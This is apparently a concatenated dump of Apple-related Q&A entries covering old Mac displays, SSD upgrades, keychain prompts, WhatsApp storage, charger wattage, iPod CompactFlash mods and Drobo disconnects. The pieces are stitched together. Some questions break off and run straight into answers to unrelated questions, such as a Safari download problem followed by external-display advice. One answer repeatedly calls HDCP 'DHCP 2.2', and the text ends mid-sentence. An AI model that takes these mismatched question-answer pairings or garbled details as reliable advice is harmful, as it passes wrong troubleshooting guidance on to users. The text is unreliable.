What was the maximum screen resolution and refresh rate that a 68K-based Macintosh could display?\nThere are reports of Mac OS 9 going up to 1920 x 1200, but that is, of course, running on a PowerPC CPU.\nI'm wondering what the highest resolution was, assuming you were running the most powerful 68K-based Mac with the latest Mac OS 8.1 (which was the last version of Mac OS that ran on 68K chips).\n\nA: If I recall correctly (happy to be corrected) the most powerful 68K Mac that was actually released commercially was the Macintosh Quadra 840AV. It was launched in July 1993 and discontinued in July 1994 and actually overlapped the period during which Apple transitioned to PowerPC processors.\nNow, depending on what you're actually asking, the thing about this model is that it had the ability to support a second display because users could expand it by inserting a NuBus video card. Depending on the card and display being used, the amount of VRAM installed, and the numbers of colours being output, one could achieve a maximum resolution of 1,152 by 870 pixels.\nFor example, the Macintosh Display Card 24AC and the Radius PrecisionColor Pro 24AC displayed this resolution (1,152 by 870) at 75Hz. However, the 1,024 by 768 resolution used by most was supported at both 60Hz and 75Hz.\nFinally, just as an aside, I refer to the following comment in your question:\n\nThere are reports of Mac OS 9 going up to 1920 x 1200, but that is, of course, running on a PowerPC CPU.\n\nI still have PowerPC based Macs that can run macOS 9 natively and display a resolution of 1,920 by 1,200 pixels, but this has nothing to do with the PowerPC CPU per se. Instead the displays are driven by the various NVIDIA GeForce graphics cards you could have it configured with. \n", "Q: Safari creates Zero bytes instead of actually downloading files Each time I Cmd+S an .mp3 or .mp4 file, it saves it, but as it turns out, as an empty Zero bytes file.

You are better off looking for some 3rd party solutions. A couple of things to consider though...\nWhat kind of interface for external displays\nIf you are looking at HDMI displays, make sure either both ends (your USB-C to HDMI adapter, and external monitor) support DHCP 2.2, or both ends doesn't. Most adapters you find on Amazon doesn't support this.\nReason why they don't support this is that DHCP is design for billions of colors and 4k, which will draw too much bandwidth from USB-C port, so you won't be able to connect anything else except power-input. Similar issue with mini-displayport adapters.\nMy personal recommendation is to use 2 external HDMI displays that doesn't require DHCP 2.2, in which case you can use 2 external USB-C hubs that supports HDMI, 2 USB-A, and 1 USB-C power-delivery for power input. As for which specific device, you may have to try a couple of them and find the best one for you. The few I've tried all failed for one reason or another, so I gave up on HDMI and went displayPort.\nAnother option to try, is that there are a few TB3 to 2-DP adapters.

Everything worked fine - installation and running system for few days.\nBut now I have problems that it keeps itself turned off and now when I started MBA, I get error - folder with question mark and MBA keeps restarting. \nIs there any way how to fix this, or I need different SSD?\n\nA: As long as you know that the hardware you specified is indeed compatible with your make/model of MacBook I would first look into everything being installed properly. Make sure everything is seated correctly and there is nothing that does not belong.\nYou may also want to take the replacement/adapter out and inspect the area around where it is installed for foreign matter (dirt) use some canned air to clean out the system and parts. Inspect for damage (use a magnifying glass!).\nReinstall everything carefully and see if it is any better.\nIf the same symptoms persist you are faced with possibly replacing (under warranty, hopefully) the SSD and/or the adapter. Contact the reseller and see what they say. They may just take both back. I would be inclined to do just that as there is no way of telling which part is defective.\n\nA: Start by replacing your old drive into it (you still have it?)... that gives you an immediate A/B split, so you can know if the issue is the change you made or something else.\nSome of those adaptors are better than others.. I've seen some which are too thick and cause pressure on the logic board. if that's your case, you could've cracked the logic board with a poorly designed adaptor.\nyour adaptor could also suffer from junk in the solder joints - which I've seen on some as well.  (we actually inspect every adaptor under a microscope prior to install, to make sure we don't have any short-outs caused by bad chineese quality issues)...\n\nA: This is an old thread, but I can post a fix to the same problem.  When I did this upgrade, initially with a SinTech adapter, everything worked fine on re-install, then several days later the system became unstable, wouldn't boot consistently, etc.  The problem turned out to be some of the SinTech adapter pins contacting with the metal on the \"shield\" of the SSD connector on the logic board.  I insulated the pins (just to the rear of the SSD connection itself) with Kapton tape, and voila!  Problem solved.  I guess over time the adapter moved just slightly (100ths of a mm) as the laptop rattled around in my backpack and caused the short.

For example, the following are some well-regarded sites:\n\n\n*\n\n*Mac Sales \n\n*Simply Mac\n\n*RAM City\n\n*Macfixit\nBy buying from a reputable store you'll be sure to get an SSD fit for purpose, regardless of manufacturer. Being reputable means they're only going to sell something that works and they'll stand behind the product they sell, regardless of the brand. I would also check out Amazon as well for particular models once you know what you're after, as you'd probably find you can buy cheaper from there.\nAnother option\nIf I was you I would seriously consider keeping your current drive and using an external Thunderbolt enclosure to increase your storage capacity. If speed isn't so important, then you could use external USB drives instead.\n", "Q: On iOS and macOS birthdays are duplicated I've been experiencing duplicated birthdays on my laptop and iphone and couldn't find the answer.

I'm using MacOS 10.10.5 MBP 11,3.\n\nThanks in advance!\n\nA: This is called \"Automatic Termination\" and is also implemented for QuickTime Player and others.  The processes stay open in the background, so they re-open quickly, but with enough memory pressure (for other processes or applications for example) they will be forced to terminate.\nTo disable it, open Terminal (in /Applications/Utilities, or search via Spotlight) and type:\ndefaults write com.apple.Grab NSDisableAutomaticTermination -bool yes\n\nThen hit enter. \nMake sure to properly quit and relaunch Grab after running this defaults write command.\nTo restore the original settings, run the following command:\ndefaults delete com.apple.Grab NSDisableAutomaticTermination\n\nFrom the Apple Developers site:\n\nAutomatic and Sudden Termination of Apps Improve the User Experience\n  In OS X v10.7 and later, the use of the Quit command to terminate an\n  app is diminished in favor of more user-centric techniques.\n  Specifically, Cocoa supports two techniques that make the termination\n  of an app transparent and fast:\nAutomatic termination eliminates the need for users to quit an app.\n  Instead, the system manages app termination transparently behind the\n  scenes, terminating apps that are not in use to reclaim needed\n  resources such as memory. Sudden termination allows the system to kill\n  an app’s process immediately without waiting for it to perform any\n  final actions. The system uses this technique to improve the speed of\n  operations such as logging out of, restarting, or shutting down the\n  computer. Automatic termination and sudden termination are independent\n  techniques, although both are designed to improve the user experience\n  of app termination. Although Apple recommends that apps support both,\n  an app can support one technique and not the other. Apps that support\n  both techniques can be terminated by the system without the app being\n  involved at all. On the other hand, if an app supports sudden\n  termination but not automatic termination, then it must be sent a Quit\n  event, which it needs to process without displaying any user interface\n  dialogs.\nAutomatic termination transfers the job of managing processes from the\n  user to the system, which is better equipped to handle the job. Users\n  do not need to manage processes manually anyway. All they really need\n  is to run apps and have those apps available when they need them.\n  Automatic termination makes that possible while ensuring that system\n  performance is not adversely affected.\nApps must opt in to both automatic termination and sudden termination\n  and implement appropriate support for them. In both cases, the app\n  must ensure that any user data is saved well before termination can\n  happen. And because the user does not quit an autoterminable app, such\n  an app should also save the state of its user interface using the\n  built-in Cocoa support. Saving and restoring the interface state\n  provides the user with a sense of continuity between app launches.\nFor information on how to support for automatic termination in your\n  app, see Automatic Termination. For information on how to support\n  sudden termination, see Sudden Termination.\n\nAutomatic and Sudden Termination of Apps Improve the User Experience\n", "Q: How do I use 'security set-keychain-settings' to prevent locking?

Ive recently noticed that from one of my keynote presentations it creates a \".spin\" log whenever i close the presentations without saving or view previous versions of the presentation with the 'Revert to' option. I believe this is due to two things: the spinning wheel showing up before it closes(as it is a large presentation and could take about 3-4 seconds to revert changes) and/or when i go to view previous versions of the presentation sometimes the spinning beachball could briefly appear.\nWhile looking in the Console app i saw the \"Keynote. . .Macbook-Air.spin\" logs and under 'Data Source' it displayed \"Stackshots\". Ive tried researching on what a stackshot is but came up short.\nI am using MacOS 10.13.4 High Sierra.\nWhat exactly is a stackshot? What are \".spin\" logs and are they correlated to the spinning beachball?\n\nA: You're pretty close. A \"stackshot\" is a recording of the call stack trace of processes on the system (including kernel threads), which is useful for debugging purposes as it provides insight into what the application is doing at the time that the stackshot was taken. macOS captures these automatically when the system detects certain types of hangs using a utility called spindump(8) (recently, it seems the original data source is tailspin(8)). Depending on your privacy settings, these get uploaded periodically for Apple to aggregate and analyze hangs across the system.\n", "Q: Can I use a USB Wi-Fi adapter to extend a Wi-Fi connection on my MacBook I want to share an internet connection (Wi-Fi) through my laptop. I understand that you can't receive internet data and create a network simultaneously using the same internal adapter, but what if I bought a Wi-Fi adapter, like this one, so one can receive data and the other transmit it?\n\nA: Yes\nYou can share/extend a network from Wi-Fi to Wi=Fi as long as you have two network adapters. In fact I am doing it right now!\nI suggest you share Wi-Fi from the USB network adapter to the Internal Network Adapter, and not the other way around as it might cause issues (see pictures).\nI would also suggest Panda Wireless PAU09 N600 Dual Band. I have used it with no problems. It works with Mac (Drivers needed), PC (Drivers needed), and Linux.  It's dual band, allowing you to connect to 5Ghz networks.

I have a MacPro 2009 reflashed as a 2010. I am considering to install a Tempo SSD PCIe card and then put High Sierra on it. This card is advertised to allow booting on it: would anyone have first hand experience with that? The background story is that my boot drive is a RAID 5 Softraid with 4 disks (the four internal slots of the machine) and I have just discovered that High Sierra can't be installed on a RAID. So if I could have put one SSD on that PCIe card and boot on it, the upgrade path would be very simple.\n\nA: I successfully installed a bootable High Sierra system on a Samsung EVO 860 (1 TB) mounted on that Tempo SSD PCIe card I asked about. I kept the RAID 5 alongside for the big important data.  \n", "Q: Is winebottler safe to install? I've been missing Notepad++ since changing from Windows to macOS and there's an article that says if I use WineBottler (that's the only thing I miss), it should run.\n\nWineBottler packages Windows-based programs like browsers, media-players, games or business appli­ca­tions snugly into Mac app-bundles.\n\nThe notepad aspect is inconsequential (in fact I nearly didn't add it in).

I've asked the related question in security SE: Why does not updating a MacOS keychain password cause applications to become troublesome? and the answer there explains that keychain is used by various applications to store \"sensitive data such as credentials, certificates and the like... passwords...\" and goes on to explain that a total list of all possibilities is beyond the scope of the question.\nBackground:\nI changed my password by using recovery mode. I'd changed it yesterday, then it suddenly appeared to stop working.\nAs I continued, I received the message (photo of screen shown below):\n\nThe system was unable to unlock your login keychain.\n\nSince I don't use my keychain at all, and since I did not understand the implications of each choice, I just selected Continue Login.\nOnce I was using my computer again, I have a persisting sequence of dialogue boxes that will not go away. They seem to interfere strongly, rendering other applications unresponsive (beachballing) until I cycle through them once or twice by clicking Cancel three or six times. Preview is particularly difficult to use now.\nFor example, I have found that when I open multiple images in Preview, I can move easily between them through cursor operations on the sidebar, but as soon as I try to use the arrow keys preview freezes and beachballs until I click through the keychain dialogues again. Same for other menu items like close and save.\nI have similar behavior for other apps. For example when TextEdit has an .rtf document that contains links, trying to use hotkeys to save will also trigger a dialogue box, but I'll ask primarily about Preview to keep it simple.\nQUESTION: Why specifically would Preview access the keychain when I use keyboard shortcuts, but not cursor clicks or menu items for the same operations? Any thoughts why this (sometimes) happens with TextEdit as well?\n\n\n\n\n\n\n\n\n\nA: Short answer: It doesn't.\nLong answer: There are plenty of reasons why this may occur. I discuss a couple of scenarios below.\nIf you recently changed your password, I would recommend reading this support article from Apple. \n\nThe password of your macOS user account might not match the password\n  of your login keychain. Either create a new login keychain or update\n  it with your new password.\n\nIf this is not the scenario for you, or if that article does not solve your problem, there are other probable scenarios. Sometimes, after updates, the Keychain may become corrupted. Using Keychain Repair from the Keychain App, you can easily fix this problem. I would refer to this answer for more information.\nI have been personally facing this issue since El Capitan, and only recently fixed this issue. When El Capitan was released, this bug was introduced to some users using FileVault. Disabling FileVault and re-enabling solves this problem as well.\nFor additional solutions, I would refer to other answers left in similar questions:\n\n\n*\n\n*How to stop my machine asking for multiple passwords when I log in? by klanomath\n\n*OS X is repeatedly asking for login keychain password by Andrei Glotov\n\n\nA: *\n\n*Preview can store files in iCloud\n\n*iCloud stores keys and certificates in the keychains\n\n\nSeems like that keychain isn't unused, and you may need to either sign out of iCloud and then delete the keychains or test with a new user account to be sure your security dependancies aren't broken.\n", "Q: I’m confused about how Whatsapp backs up data in iPhone In Settings > (my name) > iCloud > iCloud storage: I can see “Whatsapp messenger: 12.8 MB”\nIn Settings > (my name) > iCloud > iCloud storage > Backups > (My iPhone) > Whatsapp: 86 MB”\nWhat’s the difference between these two?\n\nA: The first shows you how much data, that has accumulated by using WhatsApp, is currently stored on your phone. That is chats, photos, videos and audio messages that have been send and received.\nThe second one is the Backup that can be created through WhatsApp->Settings->Chats->Chat Backup. The reason the Backup is larger than your „normal“ app data might be that WhatsApp stored multiple Backups (either from multiple devices or older ones from the same device). Another reason might be that you backed up WhatsApp on an old device or reset your current one after backing up WhatsApp, so your backup contains more data than you accumulated by using WhatsApp after switching/resetting your device.\nAgain, the first is the data that is currently used by WhatsApp, the second one is the backup and its data is not accessible/used by WhatsApp unless you restore the backup.\n\nA: I have never backed it up, but I have sort of the same problem. \nIn my case it's 670 mb of storage according to iPhone setting vs 4,45 GB according to whatsapp itself. \nI can access all the 4,45 GB of movies / pictures in my whatsapp conversations. \nDon't know why iPhone storage doesn't seem to calculate correctly. But the amount of data that you are using according to whatsapp itself (under settings), is the correct one. \n", "Q: What's a triple boot method(macOS, Linux, Windows 10) that is safe and (relatively) easy to do?

I am using rEFInd as boot manager. The only downside I experience is that I have to hold down the option key every time I reboot my MacBook and choose the OS to boot from, because otherwise it finds no OS to boot and displays some EFI error screen. Don‘t know why and if it will be an issue for you but not a big deal either.\n\nA: Judging by the volume of questions we receive, no dual boot setup meets your safe and easy criteria. I would just be sure you have a really good backup of all your data and keep your setup media, license keys and setup scripts well documented and handy so you can always just wipe your drive and start over. \nA macos wipe and reinstall from saved media takes 20 minutes.

Better to be able to set things up quickly than perfect a complicated setup. \nAlso, quality virtualization has such a low performance penalty, why even triple boot?\n", "Q: Connecting to specific Wi-Fi channels? My university Wi-Fi has multiple SSIDs with the same name, but broadcasting in different channels (as I receive signals from different routers at the same time). However, in my room my Wi-Fi disconnects often which I'm assuming is because it is connecting to a router with poor signal strength. Is there any way to manually choose the SSID channel that I wish to join?\nSurprisingly, my Android phone doesn't face this problem and is able to maintain a stable connection. I don't think anything's wrong with my MacBook as I can connect normally at other places including the lobby of my dorm.\n\nA: In a network environment with multiple Wi-Fi access points with same SSID, iOS/macOS device automatically connect to the one with the best signal strength. This should happen automatically without any intervention from user side.\nIf you find the connection to be poor, go to Settings -> Wi-Fi (on iOS)/System Preferences -> Network (on macOS) and toggle Wi-Fi off and on again. This should resolve your issue.\n", "Q: Downloading old version of any app in iPhone 8? I want to download the old version of Musically app on my iPhone 8. Please let us know the steps to download the old version of the app. I can only download the latest version of apps from the app store. Can we download the older version in the new phone?\n\nA: The following solution only works if you once installed the app at the version you want, synced with the older version of iTunes (12.6.4.3 or below), didn't update in iTunes.\nYou can also look through Time Machine backup in the\n/[iTunes Library Directory]/iTunes Media/Mobile Applications directory\n\n\n*\n\n*Plug in your iOS device\n\n*Select \"Apps\" and view all the apps in your (not the iOS device) app library .\n\n*Drag one of the apps onto the iOS device listed in the side bar\n\n*Wait for sync to finish\n\n*Celebrate\n\n\nAdditionally, you can look through iPhone backups.\n\nA: Once a new version of an app is released on the App Store, there is no way to access the older version. You may choose to not update to the newly released version, but once upgraded there is no going back.\nThis is true for any app on the App Store. A major purpose of releasing an update is to provide improved functionalities and fix issues with the previous version.\n", "Q: Replace windows installation on Macbook pro with Ubuntu I have a MacBook Pro (13-inch, Mid 2010) running OS X El Capitan with dual boot Windows.\nI would like to replace windows with Ubuntu 18.04.\nThe command disktil list shows:\n#:                       TYPE NAME                    SIZE       IDENTIFIER\n0:      GUID_partition_scheme                        *256.1 GB   disk0\n1:                        EFI EFI                     209.7 MB   disk0s1\n2:                  Apple_HFS SSJony                  127.0 GB   disk0s2\n3:                 Apple_Boot Recovery HD             650.0 MB   disk0s3\n4:       Microsoft Basic Data BOOTCAMP                128.2 GB   disk0s4\n\nI would like to increase the size of the Mac by half, to around 192 GB and the rest for Ubuntu. How can I do this?\n\nA: First step would be to delete the Windows partition using a program like Disk Utility of GParted (which is often included in the Ubuntu live disk). This will give you some unallocated space that you may be able to expand the MacOS partition to. \nAfter you've increased the size to what you want, you can run the installation of Ubuntu and create a new partition out of the remaining unallocated space. This can usually be done during the installation process.\n", "Q: iPhone vibrates several times a day with no visible notification Several times a day for the past several weeks, I'm noticing my phone briefly vibrating as though I've received a notification of some sort. However, upon checking, I have no new notifications of any kind. \nPer the suggestion in How do I know which App is sending Vibrate-only Notification?, I've triple checked my notifications, and any app which has sound enabled (and therefore vibration when phone is muted) should also either badge the icon or appear in history or the lock screen. Neither is occurring. \nHelp?! As someone who disables the vast majority of notifications so I can stay focused during the day, this is driving me crazy!\n\nA: Check your mail notifications specifically: it is possible to have vibration without sound or other notifications on a per account basis.\nSettings > Mail > Notifications and then traverse each account. Make sure both sound and vibration are both set to none, if that’s what you want.\n\nA: For me at least, this ended up being the \"Airmail\" app, which I use instead of the default Mail app. I had notifications set to Badge, but due to how Airmail retrieves messages, the received date of emails would almost always be many minutes behind when the badge occurred. Oftentimes substantially, so it never seemed to align. \nThe app gives no insight into how it retrieves messages. I'm assuming they are merely fetched at an interval and not pushed, which if they were would likely avoid this confusion. \nI eventually confirmed this by disabling notifications altogether for several apps, and narrowed it down to Airmail in the end. \n", "Q: How long does it take to enroll in the Developer Program (Organisation) How long does enrollment take as an organisation? I have been waiting for over a month and the only feedback from Apple has been:\n\"Hello,\nWe are requesting an update of your D&B Report. The current turnaround time will vary based on the country. We will be sending you an e-mail once it is complete. Your request ID is: XXXXXX\nThank you,\nD&B Customer Support\"\nThe registering organisation is in South Africa.\n\nA: Apple makes an API call to D&B to look up DUNS numbers, so it's basically instantaneous. It's pretty clear from the wording of the response that Apple isn't the hang up here.\n\n\n*\n\n*When DUNS is already set - registration takes me a day or so typically to enter everything in Apple - see that the API call matches - clear up any issues with zip code or business name between how I entered the company name in D&B and how it's entered in Apple (a space before a comma can break the API lookup - it's very precise in my experience and fails if you don't have every character exactly matching in the two systems).\n\n\nAssuming you haven't made a clerical error that's causing the DUNS lookup to fail, You'll want your business manager or corporate legal department to contact D&B and expedite the listing. D&B does accept money to expedite their listing process so you could always pay your way to an official \"credential\" from them if it's taking too long to go down the \"I'm a small business and want you to verify my credentials for free when you get to it\" path.\nIf you are a solo developer, you might find it easier to just make a personal account and sell your apps without needing D&B if you won't use that listing for other reasons. This really is a business decision about how your LLC or incorporation is set up and not really an Apple question other than this is one of several hoops they require businesses to jump through before they enter a legally binding agreement with your business.\nI would add, that joining as an enterprise takes far longer, weeks to a month if you have your legal council ready, records match and add month or two if there are hiccups like someone already signed up your company or an account is frozen or locked. \n\nA: Check if your organisation has a D-U-N-S number. The developer program enrollment shouldn't take a month. If you have the D-U-N-S number handy, share it with Apple and it will expedite the enrollment.\nYou can refer to these links from Apple Developer Support:\n\n\n*\n\n*D-U-N-S Number\n\n*Enrollment\nIt is recommended you contact Apple Developer Support for further help.\n", "Q: iPhone does not get detected on older MacBook Pro I had to switch temporarily to a MacBook Pro 13 early 2011 model and when I'm connecting my iPhone 7+ or iPad, it's not getting detected nor charged.\nOther USB devices like thumb drives or USB-microphones are working just fine.\nIf I put a voltcraft USB power converter between the iPhone/iPad and my MacBook Pro, the device is getting charged but it's still not getting detected in iTunes/duet. \nI already reset NVRAM (https://support.apple.com/en-us/HT204063) as suggested in similar posts here but that didn't fix anything and I don't know what else to try.\nAny ideas?\nThanks\n\nA: I've had the same problem before, and the following steps solved it for me:\n\n\n*\n\n*Open iTunes\n\n*Plug the phone into the computer, and unlock the phone (Either with TouchID or Passcode Unlock)\n\n*A notification should popup on your phone saying \"Trust This Computer?\", click \"Trust\"\n\n*And finally, in iTunes and after a couple of seconds it should show up\n\n\n", "Q: Difference between Internet Sharing and 'Create a Network' I have discovered two ways to share internet on my MacBook. Firstly, clicking on the Wi-Fi icon and selecting 'Create Network...'. Secondly, in System Preferences, Sharing > Internet Sharing and select 'To computers using: Wi-Fi'. What is the difference between these?\n\nA: I would think that \"create network\" allows another wifi device to connect to your mac but not browse the internet through the mac's network connection.\n\nA: The difference between the two is simple:\n\n\n*\n\n*Ad-hoc (peer-to-peer) network\n\n*Internet Sharing \n\n\nWhen you click on Create Network from the WiFi icon in the top bar, you are creating an ad-hoc network.  An ad-hoc network is just an infrastructure-less network that allows you to share resources to other local computers (i.e. file sharing).  There's typically no Internet access with this setup.  Typical use cases would be to share a file wirelessly, or to screen share (remote control) one machine with another for administration/maintenance. \nInternet Sharing, when configured through System Preferences, turns your Mac into a router with with NAT and firewall services.  A simple use case would be to allow your guests in hotel room to use the hotel internet through your login credentials.  This differs from an ad-hoc network inasmuch as you're creating the necessary infrastructure; the wireless access, the router, and the firewall.\n", "Q: Why does iPod 3G show exclamation mark / folder icon after CF upgrade? I have been trying to upgrade my iPod 3G to use a 64g CompactFlash card, as outlined in this blog post.\nI have had partial success. I can format the iPod using Disk Utility. I can get iTunes to see the iPod, and even sync songs to it.\nBut I cannot get the iPod to work by itself. When it boots, it always gets stuck on the exclamation mark / folder icon:\n\nI have tried repeatedly to use \"Update\" to fix the iPod's software. I connect the iPod to my Mac via USB, and I connect the FireWire cable to a charger so it has power.\nThe update process seems to work fine on the Mac side. iTunes eventually tells me to disconnect the iPod, and connect it to a power supply, so it can fiinish the update. The iPod itself says \"OK to disconnect.\"\nJust like in the blog post, the iPod never resets itself. It just sits at the \"OK to disconnect\" screen, even after I disconnect it. If I manually invoke a reset (as the blog author did), I end up back at the exclamation/folder icon. The update process never completes.\nI have tried almost every variation of this process I can think of, using several Macs. \nI know the iPod itself is okay. If I switch back from the CF to the stock hard drive, it works fine.\nI guess I'm about to give up on this upgrade, but wanted to see if anyone else might have suggestions how to get the iPod to complete the update process and boot normally.\n\nA: I think the issue may have been an incomplete \"update\" process via FireWire on iTunes. I received error messages like:\n\n\n*\n\n*The iPod \"Josh's iPod\" cannot be synced. The required file is locked.\n\n*The iPod \"Josh's iPod\" cannot be updated because it contains files that are in use by another application.\nUltimately, I found that the /Music/iTunes/ folder on this Mac had permissions that were causing these errors. The folder (and some files inside) was set to \"Read & Write\" for the user, but \"No Access\" for the group or the world. I changed the permissions for group and world to \"Read only\".\nAfter that I was able to successfully update/restore the iPod, and now it works but with the same quirks described in the blog post I cited above.\n", "Q: Keyboard shortcut to exit the print dialogue in safari When I press cmd-p in safari the print page shows up.\nEscape doesn't work because I've remapped my escape key to ⌥esc\nHow do I exit this without using the mouse or escape?\n\nA: Normally, use the esc key.\nThis will dismiss the dialog without using the mouse.\nThis shortcut work with most dialog boxes in macOS.  See this answer for more details.\nIf one has remapped the esc key, using command+. should dismiss the dialog as well.  (Thanks to Steve Chambers' comment.)\n", "Q: Idle iPhone and iPad hog upload bandwidth There are 2 iPhones and 2 iPads in our house and every now and then, when no one is using them, they will consume all of the available upload bandwidth of our internet connection for quite a long period of time.\nI normally just turn them off or kick them from the wifi when this starts because I don't believe they're doing anything important, I have no idea what could require them to upload so much data.\n\n\n*\n\n*The iPhones are both running iOS 11.2.6\n\n*iCloud backup is turned off on all devices\n\n*they upload both when they are plugged into a charger and when they are not.\n\n\nI have a router running LuCI lede-17.01 branch (git-17.152.82987-7f6fc16) / LEDE Reboot 17.01.2 r3435-65eec8bd5f.\nThis is a huge problem because once anything is being uploaded all other internet drops (we don't have a great connection), e.g. pings and download speeds for every other device worsen considerably.\nI want to prevent the deterioration of internet access for all other devices.\n\nA: For iCloud, try Settings/ Accounts & Passwords.  iCloud might be shown there as an Account.  If so, select it, and iCloud Backup should be on the list that comes up, showing whether it is on or off.  Other apps that share with iCloud are also listed.\n", "Q: macOS Inconsistent Printing macOS 10.13.4\nPrinter: Samsung ML-2510\n\nAfter I print one document, if I try to print another document within the next few minutes my printer does not print. On the Mac, the document briefly goes into the queue before being sent to the printer. Neither the Mac nor the printer report any errors, the document simply does not print. On the Mac, everything appears identical to when a document successfully prints (i.e. the queue is not paused, the status shows as available and the document queue clears once the printer is sent the document). The issue resolves itself if I wait a little while (~5-10 minutes) before printing the next document or by unplugging the USB cable from the Mac and plugging it back in. After that, I can again print one more document before the issue repeats itself.\nThis issue is not present when this same printer is connected to either Windows XP or Windows 7, but exists on the two different Macbook Pros (13-inch, one is 2012 and the other is 2014) both running the latest version of macOS. It was also present under OS X Yosemite. Therefore I believe the issue is Mac specific and not a fault of the printer. There is no driver from Apple for this printer so I downloaded the Mac driver directly from Samsung for this specific model number.\nAny suggestions? I've had no luck Googling the issue, although it's a difficult issue to try to search.\n\nA: As far as I can tell there is no macOS driver available for this printer, so it's unclear from your question what driver you're actually using.\nHowever, the first thing to try is to totally reset the printing system on your Mac and then to use the driver for the Samsung ML-2240 printer instead.\nBefore commencing, download and install the version 2.6 Samsung drivers directly from Apple.\nThen follow this process:\n\n\n*\n\n*Go to Apple > System Preferences\n\n*Click on the Printers & Scanners preference pane\n\n*Right-click on the list of printers on the left-hand side and select Reset printing system... \n\n*At the next prompt, click on the Reset button\n\n*Now go through the process of adding your printer - feel free to choose “Samsung ML-2510 Series” but then use the following steps to add the Samsung ML-2240 printer driver\n\n\n*\n\n*Click on the “Choose a Driver” dropdown list and choose the Select Software option\n\n*Go through the list to select the ML-2240 option\n\n\n*Complete your setup and test to see if this rectifies the problem\n\n\nHopefully this will solve the issue for you. However, if it doesn't, you can also repeat the first four steps above and then try setting up the printer using the CUPS option.\n", "Q: 60w charger only delivering 5.5w to battery? I've just bought and installed a replacement battery for my 15\" late 2012 MBP (non retina).\nThe battery is not OEM but from iFixit as they are in my opinion the next best thing. \nI was interested to see how the new battery fares, so I installed this battery monitor app to see how it was. See screenshot of report from battery app monitoring app below.\nI'm currently charging on a 60W original Apple charger (as I understand it,  the 85W is optimal, but not necessary). \nIs it correct that the charging with value = 5.5w, shouldn't it be c. 60w? \nI'm also getting very long estimated charge times, it first started at c. 5hrs, and was slowly charging. But now it seems to be slowing down at around 40% charge, and is saying time to fill the battery is c. 10hrs. \n\n\nA: \nIs it correct that the charging with value = 5.5w, shouldn't it be c.\n60w?\n\nThis is expected behavior.\nThe 60W rating on the power adapter is the maximum amount of power that the adapter will supply.  Note that it's not the amount that will be \"pushed,\" but the amount that can be drawn from it.\nSlow Charging Speed\n\n... for my 15\" late 2012 MBP (non retina)...I'm currently charging on a 60W original Apple charger (as I\nunderstand it, the 85W is optimal, but not necessary).\n\nThis is an incorrect assumption on your part.  The 2012 15\" MacBook Pro requires the 85W charger - see Apple:  Find the right power adapter and cable for your Mac notebook\nThis is why you're seeing the very long charging times - your MacBook Pro is \"asking\" for more than your adapter can deliver and since the adapter can't supply any more, it lowers the power to the battery charger in favor of the compute requirements.\nYour MacBook has two operations going on: powering the system and charging the battery.  In this scenario, priority is given to powering the system.  If you were to shut it down, the priority would naturally go to charging the battery.\nSeeing only 5 to 6W of power being allocated to a running computer is perfectly fine (for the 60W charger); the power is being divided to account for your current use.  Use the correct charger and it will operate and charge correctly.\nFurther Reading\nThere's additional questions/answers on this very topic.  Please see the following links for further reading:\n\n*\n\n*Danger of damaging 13\" macbook pro by charging it with 85w charger?\n\n\n*MacBook 2007 charger\n\n\n*Other than speed, is there a reason that a 10W iPad charger shouldn't charge a new MacBook Pro 2016?\nTL;DR\nYou're using the wrong charger.  Get the 85W charging adapter and your charge times will decrease to normal levels.\n\nA: This would be normal if your MBP is using lots of power itself. You can check this with Activity Monitor. Or a simple experiment: Turn brightness all the way down and see if you charge quicker. If the Mac is turned off, it should charge reasonably fast. \n", "Q: Has my iPhone been bricked? As of about 4 hours ago, my iPhone has refused to charge and the battery has drained, every time it gets enough power to turn on it displays the lock screen and \"9%\" battery before promptly dying after a second or two.\nI have never had any issues with my battery before today and i'm using the same charger i've always used\nEDIT:\nIt is an iPhone 5s, I have had it for about a year but is second hand, iOS 8.X, it no longer turns on at all, just displays one or other of \"charging\" or \"needs charging\" and can not reach the lock screen, I have tried 3 different charger with 2 different cables.\n\nA: Find someone who can lend you a different charger, and a different cable. Your problem is one of charger, cable, battery, or something inside the phone. You try replacing charger and cable first because they are easiest to fix. \n\nA: Troubleshooting an iPhone (or iPad) requires access to some known-good parts and accessories. As @gnasher729 suggests, either get a known-working charger and cable or try the ones you have with a working device. \nOnce (or if) you've eliminated the charger and cable, then the next likely culprit is the battery. Remove the existing battery and if possible, measure the voltage of the battery directly with a multimeter. If you are getting more than 3.2V, then the device should boot on it's own. If the voltage is good and it doesn't boot, then you have a logic board issue.\nFinally, if the battery doesn't charge or hold a charge (or if you don't have a multi-meter to test the original battery), replace it with a good quality battery from a reputable vendor or preferably, one that is known-good. If the phone still doesn't boot, once again you have a logic board issue. The only option at that point is a board-level repair, which might not be economically viable, or a replacement.\n", "Q: How do I hide names from incoming messages on whatsapp on my iphone5 I dont want the contact names to show on the notification but I stillwant the notification badge to show\n\nA: Basically, when it comes to WhatsApp there are two sets of Settings that can affect what, if anything, is previewed from your WhatsApp messages.\nWhatsApp has its own settings:\n\n\n*\n\n*Tap on WhatsApp\n\n*At bottom right tap on Settings\n\n*Tap on Notifications\n\n*Configure your settings to your liking.\n\n\nYour iPhone also has settings for Notifications. To access these, go back to your Home screen and go to Settings > Notifications. Here you can configure settings as a whole and also by individual apps.\nWhat you're wanting to do is essentially the opposite of this question, so it may be useful for you to read that as well.\n", "Q: Why would my external USB3 drive (a Drobo) keep getting disconnected? I have a mac mini (Mid 2011) running High Sierra (10.13.4) that I've been trying to use a home server. I'm not sure what the cause is, but my external USB drive (a 3rd-gen 4-drive Drobo) keeps disconnected after 16-48 hours. The Drobo is out of warranty and since June 2017 Drobo doesn't provide any community support so I haven't been able to figure out if the issue originates with the device. Aside from power cycling (which isn't the cause in my case) what might cause a USB drive to disconnect ?\n\nA: Are you using the USB cable that came with the Drobo? I know I got a bad one with my Drobo 5D that Drobo had to replace. I also recall some discussion a few years back about issues with Drobos sometimes disconnecting when the host went to sleep. Is your Mini set to never sleeps do not to sleep the connected drives?\nI’m using a Thunderbolt connection with my 2012 Mini so my only USB/Drobo experience is a 5D with Windows 10.\n\nA: I know this is an old thread.  I have a Drobo 5C (replaced a Drobo 3rd Gen unit).  This is apparently (according to Drobo) due to an issue in MacOS when the display goes to sleep.  According to Drobo, Apple starts sending a barrage of USB packets aggressively pinging the USB connected devices as part of their technology to ensure that any device plugged in while in sleep mode is not automatically mounted.  According to their tech, this high volume of ping type packets causes issues that results in the Drobo going offline.\nI do not know yet if I agree with this.  I have turned off all power management, and still experience the issue.  I had backed up all my data to a Seagate USB 3 drive, and reset my drobo.  During the restore, I ran multiple rsync jobs to restore 